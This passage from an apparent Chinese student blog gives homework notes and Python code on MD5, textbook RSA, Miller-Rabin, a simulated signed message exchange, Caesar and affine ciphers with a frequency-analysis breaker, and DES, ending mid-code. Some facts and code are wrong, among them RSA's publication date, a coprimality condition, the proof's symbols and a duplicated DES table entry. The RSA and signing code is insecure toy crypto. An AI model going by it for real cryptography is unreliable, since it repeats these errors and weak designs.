print(word2)\n\tprint(encrypt(word2))\n```\n\n**实例演示：**\n\n![demo](crypto2/2.png)\n\n**安全性分析**\n\n​\tMD5算法是一种哈希算法，所以对于MD5算法的安全问题主要在于它是否具有足够的抗碰撞性。\n\n​\t在碰撞攻击方面，王小云教授研究很深入，她的成果集中在加速构造碰撞对。原来理论上构造出一个MD5碰撞对需要2^64次尝试，而现在只需要2^39次，其算法大大加速了这一过程。但从应用场景上来看，它本身并不具备太多的应用价值，因为构造出的碰撞很可能毫无意义。它的价值在于，**在此算法基础上衍生出来的一系列MD5的算法，能够在部分场景下，构造出一个有意义的伪造信息，并且MD5值保持不变。**所以，单单看这个算法本身就说MD5不安全，有些夸大其实。但是，后续的那些算法出现之后，MD5的安全性就真的有些令人担忧了，也就是下文要说的两种算法。 \n\n- 哈希长度扩展攻击，具体细节可以参考大牛道哥的博文 [http://blog.chinaunix.net/uid-27070210-id-3255947.html](http://blog.chinaunix.net/uid-27070210-id-3255947.html)，简单说来就是在已知输入M的长度（注意是长度）和其MD5值的情况下，可以在原文M后面附加任意内容，同时能够推算出新的MD5。在某些将MD5作为签名手段的系统中，攻击者可以在原文M后面随意添加内容同时能够提供正确的MD5值。 在校学习平台上就有类似的题目\n\n  存在这一问题的原因是算法使用了Merkle–Damgård construction进行数据的压缩，不止MD5，很多流行的算法都存在这个问题，比如SHA1。 \n\n- 特定前缀攻击。两个不同的exe程序会在屏幕上打出不同的字符，但是他们的MD5值确是相同的，exe程序下载地址如下 [link](https://www.cnblogs.com/A2008A/archive/2012/08/10/2631840.html)，专家还给出了MD5碰撞快读生成器。\n\n面对这两个攻击，一个提高MD5安全性的有效手段是 **加盐（每一个口令同一个叫做”盐“（salt）的n位随机数相关联 ）**。\n\n**实用性分析：**\n\n​\t即使MD5现在已经被证明不是百分百安全的，但是被攻破只是有限情况下的个例，对于大多数安全性要求不是很高的应用中，MD5依然拥有广泛的使用空间。MD5具有压缩性，容易计算，抗修改性和强抗碰撞性等特点，在实际应用中，其结果方便存储，在对文件加密上有很大的优势（只需要32位字符串就能对一个巨大的文件进行验证完整性 ），且加密损耗低，对性能要求较低，计算迅速。由于其不可逆的特性，在实际应用中可以用来用户密码，请求参数校验，文件校验等用途。\n\n# 公钥密码\n\n## RSA公钥加密体制\n\n​\tRSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种*非对称加密算法*。RSA是目前最重要的网络加密算法。\n\n算法原理：\n\n> RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难\n\n​\t第一步\n\n> 选定两个质数p、q，实际应用中这两个数越大安全性越高。\n\n​\t第二步\n\n> 计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是*密钥长度*，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。\n\n​\t第三步\n\n> 计算n的 *欧拉函数* φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表\n\n​\t第四步\n\n>  随机选定一个数e1，要求1 < e1 < φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击[这里](https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8)\n\n​\t第五步\n\n> 寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用*扩展欧几里得算法* 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。\n\n​\t第六步\n\n> 封装*（n，e1）*为*公钥* ，*（n，e2）*为*私钥*。\n\n​\t至此，所有准备工作完成。\n\n​\t加密和解密\n\n>  先介绍一下加解密的公式，假定明文为A，那么，\n>  密文B≡A^e1 mod n，要传输给对方的就是B\n>  对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。\n\n​\t假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(*^▽^*)。\n\n>  假定要传输的明文为： 32 \n>   注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。\n\n​\t加密\n\n> A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密\n\n​\t解密\n\n> A = B^e2 mod n = 32 ，成功得到明文32！\n\n简单证明一下上述算法的正确性：\n\n *欧拉定理* \n\n> 若n,a为正整数，且n,a互质，则\n> $a^{φ(n)} ≡ 1 （mod \\; n）$ \n\n​\tφ（n）为 *欧拉函数* ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质\n\n> 如果n可以分解为两个互质的整数p、q的乘积，那么有\n> φ（n）= (p-1) * (q-1)\n\n​\t接下来要证明的就是为什么下面两个式子可以互换实现\n\n> B=A^e1   mod n\n> A=B^e2   mod n\n\n​\t解密规则为\n\n> A=B^e2 mod n\n\n​\t根据加密规则\n\n> B = A^e1 mod n\n> B = A^e1 - kn\n\n​\t代入解密式中\n\n> (A^e1 - kn)^e2 ≡ A （mod n）\n\n​\t等于证\n\n> $A^{e1\\*e2} ≡ m （mod \\; n）$\n\n​\t\n由 *欧拉定理* 可以得到\n\n> e1&#42;e2 ≡ 1  [ mod φ（n）]\n> e1&#42;e2 ≡ hφ（n）+1\n\n​\t代入前面的式子可以得到\n\n> $A^{hφ（n）+1} \\; ≡ m (mod\\;n)$\n\n​\t上式恒成立，则算法正确性得证。\n\n**代码如下：**\n\n```python\nimport gmpy2 as gp\nimport math\nimport sys\n\n# 字符串转为2进制\ndef str2bin(s):\n\ttext = \"\"\n\tfor i in s:\n\t\ttext += '{:0>8}'.format(bin(ord(i))[2:])\n\treturn text\n\ndef bin2str(s):\n\ttext = \"\"\n\tfor i in range(len(s)//8):\n\t\tif int(s[i*8:i*8+8], 2) == 0:\n\t\t\tcontinue\n\t\ttext += chr(int(s[i*8:i*8+8], 2))\n\treturn text\n\ndef fastExpMod(b, e, m):\n    result = 1\n    while e != 0:\n        if (e&1) == 1:\n            # ei = 1, then mul\n            result = (result * b) % m\n        e >>= 1\n        b = (b*b) % m\n    return result\n\n# 加密函数,输入为plain字符明文，n，e\ndef rsa_encrypt(plain):\n\tglobal n\n\tglobal e\n\t# 将明文转为比特串\n\tbitplian = str2bin(plain)\n\tgroup_len = int(math.log(n,2)) - 1 \n\tarr_group = []\n\tif (len(bitplian) % group_len) != 0:\n\t\tbitplian += \"0\"*(group_len-(len(bitplian) % group_len))\n\tfor i in range(len(bitplian) // group_len):\n\t\tarr_group.append(bitplian[i*group_len:i*group_len+group_len])\n\tcipher = \"\"\n\tfor item in arr_group:\n\t\tci = fastExpMod(int(item,2),e,n)\n\t\tcipher += f'{bin(ci)[2:]:0>{group_len+2}}'\n\treturn hex(int(cipher,2))[2:]\n\n\n# 解密函数，输入为cipehr16进制密文，n，d\ndef rsa_decrypt(cipher):\n\tglobal n\n\tglobal d\n\tbitcipher = bin(int(cipher,16))[2:]\n\ttemp_len = int(math.log(n,2)) + 1 \n\tif (len(bitcipher) % temp_len) != 0:\n\t\tbitcipher = \"0\"*(temp_len - (len(bitcipher) % temp_len)) + bitcipher\n\tgroup_len = int(math.log(n,2)) + 1\n\tarr_group = []\n\tfor i in range(len(bitcipher) // group_len):\n\t\tarr_group.append(bitcipher[i*group_len:i*group_len+group_len])\n\tbitplain = \"\"\n\tfor item in arr_group:\n\t\t# mi = (int(item,2)**d % n)\n\t\tmi = fastExpMod(int(item,2),d,n)\n\t\tbitplain += f'{bin(mi)[2:]:0>{group_len-2}}'\n\treturn bin2str(bitplain)\n\np = 2147483647\nq = 1000000007\nn = p * q\npi_n = (p-1) * (q-1)\ne = 65537\nd = int(gp.invert(e,pi_n))\n\nif __name__ == \"__main__\":\n\tmode = sys.argv[1]\n\tif mode == 'e':\n\t\tplain = input(\"Plz input message: \")\n\t\tcipher = rsa_encrypt(plain)\n\t\tprint(\"cipher: \", cipher)\n\telif mode == 'd':\n\t\tcipher = input(\"Plz input cipher: \")\n\t\tplain = rsa_decrypt(cipher)\n\t\tprint(\"plain: \",plain)\n\telse:\n\t\tpass\n```\n\n**实例演示：**\n\n![demo](crypto2/2.png)\n\n**安全性分析**\n\n​\t到目前为止，世界上还没有任何可靠的攻击RSA算法的方式 。然而即便RSA算法目前来说是安全可靠的，**但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题**，从而也派生出针对各种特定场景下的RSA攻击方法。 此处指简单列举一些攻击方法\n\n- 直接分解n。一般这种情况是由于n较小，或者使用已经使用过的p、q造成的，这样会造成RSA直接被破解\n\n- 低加密指数攻击。当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 \n\n  当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。\n\n  即：\n\n>\t$$ cequiv m^e mod n $$\n\n  如果e=3，且$ m^e<{n} $，那么：\n\n> ​\t\t\t\t\t\t$ c= m^e,$ $e=3$\n\n>  ​\t\t\t\t\t\t$ m=sqrt[3]{c}$\n\n  如果明文的三次方比n大，但是不是足够大，那么设k，有：\n\n  ​\t\t\t\t\t\t$ c= m^e+kn$\n\n  爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。\n\n- 低加密指数广播攻击。如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 \n\n  即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：\n\n  ​\t\t\t\t\t\t$ c_1equiv m^e$ $mod$ $n_1$\n\n  ​\t\t\t\t\t\t$ c_2equiv m^e$ $mod$ $n_2$\n\n  ​\t\t\t\t\t\t$ c_3equiv m^e$ $mod$ $n_3$\n\n  对上述等式运用中国剩余定理，在e=3时，可以得到：\n\n  ​\t\t\t\t\t\t$ c_xequiv m^3$ $mod$ $n_1n_2n_3$\n\n  通过对$ c_x $进行三次开方可以求得明文。\n\n- 公模攻击。如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。\n\n  即：\n\n  ​\t\t\t\t\t\t$ c_1equiv m^{e_1}$ $mod$ $n$\n\n  ​\t\t\t\t\t\t$ c_2equiv m^{e_2}$ $mod$ $n$\n\n  此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。\n\n****\n\n​\t由于RSA良好的安全性，RSA可用来电子签名中来确认通信双方身份。\n\n*****\n\n通过对RSA的分析可知，RSA的安全性是基于大数的难分解性的，所以应尽可能选择足够大的p、q，目前大素数的产生依然是一个世界难题，这里展示一个素性判断算法miller-rabin算法，可以利用此算法判断一个数是不是素数从而穷举产生大素数。\n\n```python\nfrom random import randint\nimport math\n\ndef xn_mod_p2(x, n, p):\n  res = 1\n  # n_bin = bin(n)[2:]\n  n_bin = bin(int(n))[2:]\n  for i in range(0, len(n_bin)):\n    res = res**2 % p\n    if n_bin[i] == '1':\n      res = res * x % p\n  return res\n\ndef miller_rabin_witness(a, p):\n  if p == 1:\n    return False\n  if p == 2:\n    return True\n  #p-1 = u*2^t 求解 u, t\n  n = p - 1\n  t = int(math.floor(math.log(n, 2)))\n  u = 1\n  while t > 0:\n    u = n / 2**t\n    if n % 2**t == 0 and u % 2 == 1:\n      break\n    t = t - 1\n  b1 = b2 = xn_mod_p2(a, u, p)\n  for i in range(1, t + 1):\n    b2 = b1**2 % p\n    if b2 == 1 and b1 != 1 and b1 != (p - 1):\n      return False\n    b1 = b2\n  if b1 != 1:\n    return False\n  return True\ndef prime_test_miller_rabin(p, k):\n  while k > 0:\n    a = randint(1, p - 1)\n    if not miller_rabin_witness(a, p):\n      return False\n    k = k - 1\n  return True\n\nnum = input(u\"请输入要进行Miller-Rabin算法检测的数：\")\nif prime_test_miller_rabin(int(num),10):\n\tprint (u\"{0}大概率是素数\".format(num))\nelse:\n\tprint (u\"{0}是合数 \".format(num))\n```\n\n**实例演示：**\n\n![demo](crypto2/3.png)\n\n# 通信过程模拟\n\n​\t有了前面的算法基础，我们现在可以模拟出一个从Alice到Bob的通信过程，步骤如下:\n\n![demo](crypto2/4.png)\n\n​\t接下来用代码详细模拟了一下该过程\n\n```python\nimport rsa\nimport md5\nimport des\n\nprint(\"现在开始模拟Alice到Bob之间的通信过程：\")\nprint()\nprint('*******Alice的发送准备*********')\nprint()\nmessage = \"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!\"\n\n# 设定message哈希值\nmessage_hash = md5.encrypt(message)\nsign = rsa.rsa_encrypt(message_hash)\nkey = \"infosecu\"\nprint(\"Alice想要发送到明文信息: \",message)\nprint(\"Alice的DES秘钥：\", key)\nprint(\"消息哈希(用于检验消息完整性): \",message_hash)\nprint(\"Alice签名: \", sign)\n\nprint()\nprint('公开信道上传输DES加密数据')\nprint()\nprint('*******sending...**********')\nprint()\nsend_mess = des.encrypt(message,key)\nsend_sign = des.encrypt(sign,key)\nprint(\"message: \",send_mess)\nprint(\"sign: \",send_sign)\nprint(\"message_hash: \",message_hash)\nprint()\nprint('********sending finish*******')\nprint()\nprint()\nprint(\"********Bob处理收到的信息********\")\nprint()\nprint(\"DES解密对应的内容：\")\nb_sign = des.decrypt(send_sign,key)\nb_mess = des.decrypt(send_mess,key)\nprint(\"Alice发送的明文message： \",b_mess)\nprint(\"消息签名sign： \",b_sign)\nprint()\nb_mess_hash = md5.encrypt(message)\nprint(\"此时Bob自己求出明文哈希值： \", b_mess_hash)\nprint(\"之后与Alice发送的消息哈希进行校验\")\nprint(\"...****....\")\n\nprint(b_mess_hash,\"==\",message_hash,\"消息在传输过程中没有出错! 但是无法确定是否是Alice所发。\")\nprint()\n\nvert = rsa.rsa_decrypt(sign)\nprint(\"Bob对签名进行RSA解密： \",vert)\nprint(\"对解密后的签名值与自己计算出的MD5值相比较来验证发送方身份..\")\nprint(\"verting.....\")\nif vert == b_mess_hash:\n\tprint(\"message is ok. 此时Bob可以确认从Alice处收到了完整的信息。\")\nelse:\n\tprint(\"message is broken.\")\nprint()\nprint(\"通信过程完成，Bob收到了Alice的信息！\")\n```\n\n**实例演示：**\n\n![demo](crypto2/5.png)\n\n","tags":["Crypto"],"categories":["Record"]},{"title":"密码学作业记录（一）","url":"/2019/01/15/crypto1/","content":"\n# 前言\n\n最近在学习密码学，研究了一些密码学算法，特此记录一下。\n\n<!--more-->\n\n# 古典密码\n\n古典密码体制是基于古代落后的计算条件和落后的密码学与数学知识建立的，本部分选取了**凯撒密码**和**仿射密码**。\n\n## 凯撒密码\n\n凯撒密码本质上是一种置换密码，且为一对一的置换加密方式。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。\n\n*代码如下*\n\n```python\n# 名密文输入范围是26个英文小写字母\nimport sys\n\nmode = sys.argv[1]\nif mode == \"encrypt\":\n\tplain = raw_input(\"Please input plaintext: \")\n\tkey = input(\"Please input key: \")\n\tcip = \"\"\n\tfor i in range(len(plain)):\n\t\ttemp = (ord(plain[i]) - ord('a') + key) % 26 + ord('a')\n\t\tcip += chr(temp)\n\tprint(\"cipher: \" + cip)\n\nelif mode == \"decrypt\":\n\tcipher = raw_input(\"Please input cipher: \")\n\tkey = input(\"Please input key: \")\n\tpla = \"\"\n\tfor i in range(len(cipher)):\n\t\ttemp = (ord(cipher[i])-ord(\"a\") - key) % 26 + ord('a')\n\t\tpla += chr(temp)\n\tprint(\"plaintext: \" + pla)\nelse:\n\tprint(sys.argv[1],\" is not supported:(\")\n```\n\n![demo](crypto1/1.png)\n\n> 安全性分析：可以看到，凯撒密码的加解密方式简单，手工即可实现，在古代落后的计算能力之下，该中算法拥有着很高的安全性，但是放在现在由于计算能力的提高，该算法表现出脆弱性，无法抵抗穷举攻击，因为对于一串明文，可能的加密组合只有26种，以现在的计算手段，对于任何攻击方式都表现出极大的脆弱性，当遭受**已知明文攻击**时完全没有抵抗性，故而现代密码体制中已不再采用该密码。\n\n## 仿射密码\n\n仿射密码的加密算法就是一个线性变换，及对任意的明文字符x，对应的密文字符为 `y≡e(x)≡ax+b(mod 26)`，其中a,b均为26以内的正整数，并且要求`gcd(a,26)=1`，函数e(x)称为仿射加密函数，解密时用`x≡d(e(x))≡a'(e(x)-b)(mod 26)`来解密。\n\n*代码如下：*\n\n```python\nimport sys\nimport math\n\ndef get_re(a):\n\tfor i in range(0,27):\n\t\tif i*a % 26 == 1:\n\t\t\treturn i\n\n# ex = ax+b\nmode = sys.argv[1]\nif mode == \"e\":\n\tp = str(input(\"Plz input plain: \"))\n\ta = int(input(\"Plz input a: \"))\n\tb = int(input(\"Plz input b: \"))\n\tc = \"\"\n\tfor i in range(len(p)):\n\t\tt = ((ord(p[i]) - ord('a')) * a + b) % 26 + ord('a')\n\t\tc += chr(t)\n\tprint(\"cipher: \" + c)\nelif mode == \"d\":\n\t# a'(e(x)-b)\n\tc = str(input(\"Plz input cipher: \"))\n\ta = int(input(\"Plz input a: \"))\n\tb = int(input(\"Plz input b: \"))\n\tp = \"\"\n\t_a = get_re(a)\n\tfor i in range(len(c)): \n\t\tt = (ord(c[i]) - ord('a') - b)*_a % 26 + ord('a')\n\t\tp += chr(t)\n\tprint(\"plain: \" + p)\nelse:\n\tprint(\"Input Error:(\")\n```\n\n> 加密时按照加密公式给出，解密时用穷举法求出a的逆元从而解密。\n\n*实例演示*\n\n![demo](crypto1/2.png)\n\n-----------\n\n　　可以看到，仿射加密和凯撒加密本质都是一种一对一的加密方式，这种加密方式没有将字母出现的统计规律隐藏起来，在英文中对于足够长的英文文本来说，字符的出现频率是相对固定的，还有字母的有些组合出现频率也是相对固定的，这样就可以通过统计分析法来破解上述加密方式加密出来的密文。\n\t\n*频率分析法破解仿射密码*\n\n```\n假如我们已知一串密文 fmxvedkaphferbndkrxrsrefmorudsdkdvshvufedkaprkdlyevlrhhrh，\n此时可以通过频率分析法尝试爆破出明文\n```\n\n*代码如下*\n\n```python\nimport gmpy2\nimport sys\n\ndic = ['e','t','a','o','i','n','s','h','r','d','l','c','u','m','w','f','g','y','p','b','v','k','j','x','q','z']\nfreq = [0] * 26\ncipher = input(\"Plz input cipher: \")\n\n# 频率统计\nfor i in range(len(cipher)):\n\tt = ord(cipher[i])-ord('a')\n\tfreq[t] += 1\t\n\ndef get_ab(x,y):\n\tdic = ['e','t','a','o','i','n','s','h','r','d','l','c','u','m','w','f','g','y','p','b','v','k','j','x','q','z']\n\trepeat = []   # 去除重复计算的项\n\tfor one in dic:\n\t\tfor two in dic:\n\t\t\to = ord(one) - ord('a')\n\t\t\tt = ord(two) - ord('a')\n\t\t\too = ord(x) - ord('a')\n\t\t\ttt = ord(y) - ord('a')\n\t\t\t# oo = a*o+b\n\t\t\t# tt = a*t+b\n\t\t\tif o - t == 0:\n\t\t\t\tcontinue\n\t\t\ta = ((oo-tt)//(o-t)) % 26\n\t\t\tb = (oo - a * o) % 26\n\t\t\ttest =  int(gmpy2.gcd(a, 26))\n\t\t\tif test != 1:\n\t\t\t\tcontinue\n\t\t\telse:\n\t\t\t\t_a = gmpy2.invert(a, 26)\n\t\t\tplain = \"\"\n\t\t\tif (a,b) in repeat:\n\t\t\t\tcontinue\n\t\t\tfor item in cipher:\n\t\t\t\tex = ord(item) - ord('a')\n\t\t\t\tp = (_a * (ex - b)) % 26\n\t\t\t\tplain += chr(p+ord('a'))\n\t\t\trepeat.append((a,b))\n\t\t\tprint(plain,end=\"\")\n\t\t\tprint(\"**\" + str(a) + \"**\" + str(b))\n\tprint(\"共\" + str(len(repeat)) + \"项.\")\n\nx = chr(freq.index(max(freq)) + ord('a'))\nfreq[freq.index(max(freq))] = 0\ny = chr(freq.index(max(freq)) + ord('a'))\nget_ab(x,y)\n```\n\n代码思路是先统计密文的字母出现频率，由频率高低依次对应字母频次表，联立方程组，由于未知数只有a、b，所以只需要两个方程是即可解出，依次尝试不同的变换组合即可，直至得到有意义的明文，由于统计基数的原因，密文越长，则越可能早的得到有意义的密文。为了使结果显示更加有效，代码中过滤了冗余的待选明文项（即a、b相同的情况）。\n\n![demo](crypto1/3.png)\n\n可以看到密文被成功破解\n\n*********\n\n　　从对古典密码分析中可以看到，一个密码体系要保证安全性，应该尽可能的隐藏语言特性，即密文均匀分布，且加密的可选字符区间应尽可能的大，否则无法抵抗穷举攻击。在现代密码体制中，这两点都有了比较好的保证。\n\n# 分组密码\n\n## DES加密算法\n\nDES算法为密码体制中的对称密码体制，又被称为美国数据加密标准，是1972年美国IBM公司研制的对称密码体制加密算法。 明文按64位进行分组，密钥长64位，密钥事实上是56位参与DES运算（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1）分组后的明文组和56位的密钥按位替代或交换的方法形成密文组。 \n\nDES加密流程如下图\n\n![demo](crypto1/5.png)\n\n解密时只需要将机密流程逆序即可。\n\n算法大致步骤如下：\n\n1. 初始置换\n\n​DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。初始置换规则可查表获得，这里不再赘述。初始置换是固定的、公开的函数，因此这个初始置换及逆初始置换都没有密码意义，主要目的是为了更好地将明文和密文分组。\n\n******\n\n下一步是进行轮函数（F函数）迭代，F函数具体步骤如下\n\n2. 扩展置换（E盒）\n\n初始置换结束后，将得到64位序列分成两组，各32位，而E盒将数据的右32位输入扩展为48位输出，改变了位的次序，重复了某些位。\n\n该步骤的目的是：a、产生与秘钥相同长度的数据以进行异或运算，R0是32位，子秘钥是48位，所以R0要先进行扩展置换之后与子秘钥进行异或运算；b、提供更长的结果，使得在替代运算时能够进行压缩。\n\n3. 秘钥加运算\n\n该步骤非常简单，将E扩展输出的48位与48位子秘钥进行逐位异或，输出48位数据。\n\n4. 代换盒（S盒）\n\n此步骤的功能是进行非线性变换，S盒是DES中唯一的非线性部分，经过S盒代换压缩之后，48位的数据重新被压缩成32位。\n\n代换压缩由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果\n\nS盒具有良好的非线性，输入的每一个比特与全部输入比特有关，两个输入相差1比特时，输入至少相差2比特，极大的保证了安全性。\n\n5. 置换运算（P盒）\n\n置换运算（P盒）只是进行简单位置置换，而不进行扩展和压缩。\n\n至此**F函数**结束\n\n*********\n\n6. 逆置换\n\n将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为**F函数**。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。\n\n*代码如下：*\n\n```python\nimport sys\nimport binascii\n\nip = [57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, \n11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23,\n15, 7, 56, 48, 40, 32, 24, 16, 8, 0, 58, 50, 42, 34, 26, 18, 10, 2, 60, \n52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6]\n\n# 逆矩阵\n_ip = [39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, \n62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, \n60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, \n58, 26, 33, 1, 41, 9, 49, 17, 57, 25, 32, 0, 40, 8, 48, 16, 56, 24]\n\n# 初始化c、d数组\nc = [\"\"]*17\nd = [\"\"]*17\nk = [\"\"]*17\n\n# 左右32位数组\nl = [\"\"]*17\nr = [\"\"]*17\ndef generate_secretkey(key, round):\n\tpc1 = [56, 48, 40, 32, 24, 16, 8, 0, 57, 49, 41, 33, 25, 17, \n\t\t9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 62, 54, \n\t\t46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 60, 52, \n\t\t4, 36, 28, 20, 12, 4, 27, 19, 11, 3]\n\trespc1 = \"\"\n\tfor i in range(56):\n\t\trespc1 += key[pc1[i]]\n\tc[0] = respc1[:28]\n\td[0] = respc1[28:]\n\tk[0] = c[0] + d[0]\n\tfor i in range(1,round+1):\n\t\tif i in (1,2,9,16):\n\t\t\t# 左移1位\n\t\t\tc[i] = c[i-1][1:] + c[i-1][:1]\n\t\t\td[i] = d[i-1][1:] + d[i-1][:1]\n\t\telse:\n\t\t\tc[i] = c[i-1][2:] + c[i-1][:2]\n\t\t\td[i] = d[i-1][2:] + d[i-1][:2]\n\tsecret = c[round] + d[round]\n\tpc2 = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,\n\t\t16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,\n\t\t44,49,39,56,34,53,46,42,50,36,29,32]\n\ts_key = \"\" # 生成本轮最终秘钥\n\tfor i in range(48):\n\t\ts_key += secret[pc2[i]-1]\n\treturn s_key\n\n# 初始置换，输入为64位数据，8个ascii字符\ndef init_replace(data):\n\tre = \"\"\n\tfor i in range(64):\n\t\tre += data[ip[i]]\n\treturn re\n\n# 扩展置换，输入为32位数据，输出为48位数据\ndef e_replace(data):\n\te_box = [31, 0, 1, 2, 3, 4, 3, 4, 5, 6, 7, 8, 7, 8, 9, 10, 11, \n\t\t12, 11, 12, 13, 14, 15, 16, 15, 16, 17, 18, 19, 20, 19, 20, 21, \n\t\t22, 23, 24, 23, 24, 25, 26, 27, 28, 27, 28, 29, 30, 31, 0]\n\tre = ['a'] * 48\n\tfor i in range(48):\n\t\tre[i] = data[e_box[i]]\n\treturn re\n\n# 秘钥加处理\ndef secret_plus(data, key):\n\tout = \"\"\n\tfor i in range(48):\n\t\tout += str(int(data[i])^int(key[i]))\n\treturn out\n\n# s盒置换，输入48位，输出32位\ndef s_replace(data):\n\ts1 = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7],\n\t\t[0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8],\n\t\t[4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0],\n\t\t[15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]]\n\ts2 = [[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10],\n\t\t[3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5],\n\t\t[0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15],\n\t\t[13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9]]\n\ts3 = [[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8],\n\t\t[13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1],\n\t\t[13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7],\n\t\t[1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12]]\n\ts4 = [[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15],\n\t\t[13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9],\n\t\t[10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4],\n\t\t[3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14]]\n\ts5 = [[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9],\n\t\t[14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6],\n\t\t[4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14],\n\t\t[11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3]]\n\ts6 = [[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11],\n\t\t[10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8],\n\t\t[9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6],\n\t\t[4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13]]\n\ts7 = [[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1],\n\t\t[13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6],\n\t\t[1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2],\n\t\t[6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12]]\n\ts8 = [[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7],\n\t\t[1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2],\n\t\t[7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8],\n\t\t[2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]]\n\tre = []\n\tfor i in range(48//6):\n\t    re.append(data[6*i:6*i+6])\n\n\t# 开始进行s盒置换\n\tdic = [s1,s2,s3,s4,s5,s6,s7,s8]\n\tretn = \"\"\n\tfor i in range(8):\n\t\tr = int(re[i][0] + re[i][5],2)\n\t\tc = int(re[i][1:5], 2)\n\t\ttemp = str(bin(dic[i][r][c]))[2:]\n\t\ttemp = \"0\"*(4-len(temp)) + temp\n\t\tretn += temp\n\t# print(len(retn))\n\treturn retn\n\n# p盒置换，输入输出均为32位\ndef p_replace(data):\n\tp = [15, 6, 19, 20, 28, 11, 27, 16, 0, 14, 22, 25, 4, 17, 30, 9, 1, 7, \n\t\t23, 13, 31, 26, 2, 8, 18, 12, 29, 5, 